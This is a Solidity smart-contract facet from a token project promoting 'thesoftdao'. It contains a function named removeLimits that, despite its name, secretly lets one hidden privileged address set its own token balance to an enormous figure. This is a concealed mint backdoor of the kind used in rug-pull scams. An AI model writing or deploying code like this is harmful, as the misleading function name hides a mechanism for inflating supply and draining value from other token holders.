/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.thesoftdao.com
 * X: https://twitter.com/thesoftdao
 * Tele: https://t.me/theSoftDAO
 * Discord: https://discord.com/invite/thesoftdao
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
